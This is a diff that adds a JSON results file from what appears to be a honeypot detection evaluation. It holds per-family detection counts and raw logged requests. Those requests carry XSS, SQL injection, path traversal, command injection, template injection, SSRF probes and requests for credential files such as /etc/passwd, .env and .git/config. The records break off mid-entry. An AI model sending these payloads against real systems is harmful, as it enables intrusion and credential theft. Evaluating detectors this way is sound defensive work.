@@ -1,0 +1,1944 @@
+{
+  "run_id": "ai_eval_20261107_225930",
+  "web": {
+    "attack_requests": 34,
+    "attack_logged": 34,
+    "attack_suspicious": 31,
+    "attack_events": 31,
+    "attack_ai_applied": 28,
+    "benign_requests": 6,
+    "benign_suspicious": 0,
+    "benign_events": 0,
+    "by_family": {
+      "xss": {
+        "total": 5,
+        "logged": 5,
+        "suspicious": 5,
+        "events": 5,
+        "ai_applied": 5,
+        "ai_points": 125
+      },
+      "sqli": {
+        "total": 5,
+        "logged": 5,
+        "suspicious": 5,
+        "events": 5,
+        "ai_applied": 5,
+        "ai_points": 123
+      },
+      "path_traversal": {
+        "total": 4,
+        "logged": 4,
+        "suspicious": 4,
+        "events": 4,
+        "ai_applied": 4,
+        "ai_points": 100
+      },
+      "sensitive_path": {
+        "total": 5,
+        "logged": 5,
+        "suspicious": 4,
+        "events": 4,
+        "ai_applied": 4,
+        "ai_points": 100
+      },
+      "scanner": {
+        "total": 3,
+        "logged": 3,
+        "suspicious": 3,
+        "events": 3,
+        "ai_applied": 0,
+        "ai_points": 0
+      },
+      "command_injection": {
+        "total": 3,
+        "logged": 3,
+        "suspicious": 2,
+        "events": 2,
+        "ai_applied": 2,
+        "ai_points": 34
+      },
+      "ssti": {
+        "total": 3,
+        "logged": 3,
+        "suspicious": 2,
+        "events": 2,
+        "ai_applied": 2,
+        "ai_points": 22
+      },
+      "ssrf": {
+        "total": 3,
+        "logged": 3,
+        "suspicious": 3,
+        "events": 3,
+        "ai_applied": 3,
+        "ai_points": 35
+      },
+      "xxe": {
+        "total": 3,
+        "logged": 3,
+        "suspicious": 3,
+        "events": 3,
+        "ai_applied": 3,
+        "ai_points": 0
+      },
+      "benign": {
+        "total": 6,
+        "logged": 6,
+        "suspicious": 0,
+        "events": 0,
+        "ai_applied": 0,
+        "ai_points": 0
+      }
+    }
+  },
+  "raw_requests": [
+    {
+      "id": 133,
+      "src_ip": "203.0.113.17",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "q=%3Cscript%3Ealert(document.cookie)%3C/script%3E",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-01\", \"X-Forwarded-For\": \"203.0.113.17\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:30"
+    },
+    {
+      "id": 134,
+      "src_ip": "203.0.113.45",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "q=%3Cimg%20src=x%20onerror=alert(1)%3E",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-02\", \"X-Forwarded-For\": \"203.0.113.45\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:31"
+    },
+    {
+      "id": 135,
+      "src_ip": "203.0.113.99",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "q=%3Csvg/onload=alert(1)%3E",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-03\", \"X-Forwarded-For\": \"203.0.113.99\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:31"
+    },
+    {
+      "id": 136,
+      "src_ip": "198.51.100.23",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "q=%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-04\", \"X-Forwarded-For\": \"198.51.100.23\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:32"
+    },
+    {
+      "id": 137,
+      "src_ip": "198.51.100.77",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "q=javascript:alert(1)//",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-05\", \"X-Forwarded-For\": \"198.51.100.77\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:33"
+    },
+    {
+      "id": 138,
+      "src_ip": "192.0.2.31",
+      "method": "GET",
+      "path": "/products",
+      "query_string": "id=1%20UNION%20SELECT%20username,password%20FROM%20users",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-06\", \"X-Forwarded-For\": \"192.0.2.31\"}",
+      "is_suspicious": 1,
+      "threat_score": 50,
+      "create_time": "2026-11-07 22:59:33"
+    },
+    {
+      "id": 139,
+      "src_ip": "192.0.2.88",
+      "method": "GET",
+      "path": "/products",
+      "query_string": "id=1'%20OR%20'1'='1",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-07\", \"X-Forwarded-For\": \"192.0.2.88\"}",
+      "is_suspicious": 1,
+      "threat_score": 50,
+      "create_time": "2026-11-07 22:59:34"
+    },
+    {
+      "id": 140,
+      "src_ip": "192.0.2.200",
+      "method": "GET",
+      "path": "/products",
+      "query_string": "id=admin'--",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-08\", \"X-Forwarded-For\": \"192.0.2.200\"}",
+      "is_suspicious": 1,
+      "threat_score": 40,
+      "create_time": "2026-11-07 22:59:34"
+    },
+    {
+      "id": 141,
+      "src_ip": "203.0.113.17",
+      "method": "GET",
+      "path": "/products",
+      "query_string": "id=1%20AND%20SLEEP(5)",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-09\", \"X-Forwarded-For\": \"203.0.113.17\"}",
+      "is_suspicious": 1,
+      "threat_score": 50,
+      "create_time": "2026-11-07 22:59:35"
+    },
+    {
+      "id": 142,
+      "src_ip": "203.0.113.45",
+      "method": "GET",
+      "path": "/products",
+      "query_string": "id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-10\", \"X-Forwarded-For\": \"203.0.113.45\"}",
+      "is_suspicious": 1,
+      "threat_score": 50,
+      "create_time": "2026-11-07 22:59:36"
+    },
+    {
+      "id": 143,
+      "src_ip": "203.0.113.99",
+      "method": "GET",
+      "path": "/page",
+      "query_string": "file=../../../../etc/passwd",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-11\", \"X-Forwarded-For\": \"203.0.113.99\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:36"
+    },
+    {
+      "id": 144,
+      "src_ip": "198.51.100.23",
+      "method": "GET",
+      "path": "/page",
+      "query_string": "file=..%2F..%2F..%2Fetc%2Fpasswd",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-12\", \"X-Forwarded-For\": \"198.51.100.23\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:37"
+    },
+    {
+      "id": 145,
+      "src_ip": "198.51.100.77",
+      "method": "GET",
+      "path": "/page",
+      "query_string": "file=..%5C..%5C..%5Cwindows%5Cwin.ini",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-13\", \"X-Forwarded-For\": \"198.51.100.77\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:37"
+    },
+    {
+      "id": 146,
+      "src_ip": "192.0.2.31",
+      "method": "GET",
+      "path": "/page",
+      "query_string": "file=....//....//etc/passwd",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-14\", \"X-Forwarded-For\": \"192.0.2.31\"}",
+      "is_suspicious": 1,
+      "threat_score": 47,
+      "create_time": "2026-11-07 22:59:38"
+    },
+    {
+      "id": 147,
+      "src_ip": "192.0.2.88",
+      "method": "GET",
+      "path": "/.env",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-15\", \"X-Forwarded-For\": \"192.0.2.88\"}",
+      "is_suspicious": 1,
+      "threat_score": 40,
+      "create_time": "2026-11-07 22:59:39"
+    },
+    {
+      "id": 148,
+      "src_ip": "192.0.2.200",
+      "method": "GET",
+      "path": "/.git/config",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-16\", \"X-Forwarded-For\": \"192.0.2.200\"}",
+      "is_suspicious": 1,
+      "threat_score": 55,
+      "create_time": "2026-11-07 22:59:39"
+    },
+    {
+      "id": 149,
+      "src_ip": "203.0.113.17",
+      "method": "GET",
+      "path": "/dump.sql",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-17\", \"X-Forwarded-For\": \"203.0.113.17\"}",
+      "is_suspicious": 1,
+      "threat_score": 40,
+      "create_time": "2026-11-07 22:59:40"
+    },
+    {
+      "id": 150,
+      "src_ip": "203.0.113.45",
+      "method": "GET",
+      "path": "/backup.zip",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-18\", \"X-Forwarded-For\": \"203.0.113.45\"}",
+      "is_suspicious": 1,
+      "threat_score": 40,
+      "create_time": "2026-11-07 22:59:41"
+    },
+    {
+      "id": 151,
+      "src_ip": "203.0.113.99",
+      "method": "GET",
+      "path": "/admin_v2/login",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-19\", \"X-Forwarded-For\": \"203.0.113.99\"}",
+      "is_suspicious": 0,
+      "threat_score": 15,
+      "create_time": "2026-11-07 22:59:42"
+    },
+    {
+      "id": 152,
+      "src_ip": "198.51.100.23",
+      "method": "GET",
+      "path": "/",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"sqlmap/1.8.7#stable (https://sqlmap.org)\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-20\", \"X-Forwarded-For\": \"198.51.100.23\"}",
+      "is_suspicious": 1,
+      "threat_score": 22,
+      "create_time": "2026-11-07 22:59:42"
+    },
+    {
+      "id": 153,
+      "src_ip": "198.51.100.77",
+      "method": "GET",
+      "path": "/",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Nikto/2.1.6\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-21\", \"X-Forwarded-For\": \"198.51.100.77\"}",
+      "is_suspicious": 1,
+      "threat_score": 20,
+      "create_time": "2026-11-07 22:59:43"
+    },
+    {
+      "id": 154,
+      "src_ip": "192.0.2.31",
+      "method": "GET",
+      "path": "/",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Nmap Scripting Engine)\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-22\", \"X-Forwarded-For\": \"192.0.2.31\"}",
+      "is_suspicious": 1,
+      "threat_score": 22,
+      "create_time": "2026-11-07 22:59:43"
+    },
+    {
+      "id": 155,
+      "src_ip": "192.0.2.88",
+      "method": "GET",
+      "path": "/tools",
+      "query_string": "cmd=127.0.0.1;cat%20/etc/passwd",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-23\", \"X-Forwarded-For\": \"192.0.2.88\"}",
+      "is_suspicious": 1,
+      "threat_score": 51,
+      "create_time": "2026-11-07 22:59:44"
+    },
+    {
+      "id": 156,
+      "src_ip": "192.0.2.200",
+      "method": "GET",
+      "path": "/tools",
+      "query_string": "cmd=$(whoami)",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-24\", \"X-Forwarded-For\": \"192.0.2.200\"}",
+      "is_suspicious": 1,
+      "threat_score": 28,
+      "create_time": "2026-11-07 22:59:44"
+    },
+    {
+      "id": 157,
+      "src_ip": "203.0.113.17",
+      "method": "GET",
+      "path": "/tools",
+      "query_string": "cmd=127.0.0.1%7Cid",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-25\", \"X-Forwarded-For\": \"203.0.113.17\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:45"
+    },
+    {
+      "id": 158,
+      "src_ip": "203.0.113.45",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "name=%7B%7B7*7%7D%7D",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-26\", \"X-Forwarded-For\": \"203.0.113.45\"}",
+      "is_suspicious": 1,
+      "threat_score": 20,
+      "create_time": "2026-11-07 22:59:46"
+    },
+    {
+      "id": 159,
+      "src_ip": "203.0.113.99",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "name=$%7B7*7%7D",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-27\", \"X-Forwarded-For\": \"203.0.113.99\"}",
+      "is_suspicious": 1,
+      "threat_score": 40,
+      "create_time": "2026-11-07 22:59:46"
+    },
+    {
+      "id": 160,
+      "src_ip": "198.51.100.23",
+      "method": "GET",
+      "path": "/search",
+      "query_string": "name=%3C%25=%207*7%20%25%3E",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-28\", \"X-Forwarded-For\": \"198.51.100.23\"}",
+      "is_suspicious": 0,
+      "threat_score": 0,
+      "create_time": "2026-11-07 22:59:47"
+    },
+    {
+      "id": 161,
+      "src_ip": "198.51.100.77",
+      "method": "GET",
+      "path": "/api/preview",
+      "query_string": "url=http://169.254.169.254/latest/meta-data/",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-29\", \"X-Forwarded-For\": \"198.51.100.77\"}",
+      "is_suspicious": 1,
+      "threat_score": 54,
+      "create_time": "2026-11-07 22:59:47"
+    },
+    {
+      "id": 162,
+      "src_ip": "192.0.2.31",
+      "method": "GET",
+      "path": "/api/preview",
+      "query_string": "url=file:///etc/passwd",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-30\", \"X-Forwarded-For\": \"192.0.2.31\"}",
+      "is_suspicious": 1,
+      "threat_score": 20,
+      "create_time": "2026-11-07 22:59:50"
+    },
+    {
+      "id": 163,
+      "src_ip": "192.0.2.88",
+      "method": "GET",
+      "path": "/api/preview",
+      "query_string": "url=http://127.0.0.1:5001/",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-31\", \"X-Forwarded-For\": \"192.0.2.88\"}",
+      "is_suspicious": 1,
+      "threat_score": 30,
+      "create_time": "2026-11-07 22:59:52"
+    },
+    {
+      "id": 164,
+      "src_ip": "192.0.2.200",
+      "method": "POST",
+      "path": "/api/preview",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Content-Type\": \"application/xml\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-32\", \"X-Forwarded-For\": \"192.0.2.200\", \"Content-Length\": \"95\"}",
+      "is_suspicious": 1,
+      "threat_score": 24,
+      "create_time": "2026-11-07 22:59:54"
+    },
+    {
+      "id": 165,
+      "src_ip": "203.0.113.17",
+      "method": "POST",
+      "path": "/api/preview",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Content-Type\": \"application/xml\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-33\", \"X-Forwarded-For\": \"203.0.113.17\", \"Content-Length\": \"95\"}",
+      "is_suspicious": 1,
+      "threat_score": 24,
+      "create_time": "2026-11-07 22:59:55"
+    },
+    {
+      "id": 166,
+      "src_ip": "203.0.113.45",
+      "method": "POST",
+      "path": "/api/preview",
+      "query_string": "",
+      "headers": "{\"Host\": \"127.0.0.1:5000\", \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0 Safari/537.36\", \"Accept-Encoding\": \"gzip, deflate\", \"Accept\": \"*/*\", \"Connection\": \"keep-alive\", \"Content-Type\": \"application/xml\", \"X-Honeypot-Eval\": \"ai_eval_20261107_225930\", \"Accept-Language\": \"zh-CN,zh;q=0.9\", \"X-Honeypot-Case\": \"ai_eval_20261107_225930-34\", \"X-Forwarded-For\": \"203.0.113.45\", \"Content-Length\": \"95\"}",
+      "is_suspicious": 1,
+      "threat_score": 24,
+      "create_time": "2026-11-07 22:59:55"
+    },
+    {
+      "id": 167,
+      "src_ip": "203.0.113.99",
+      "method": "GET",
+      "path": "/",
+      "query_string": "",
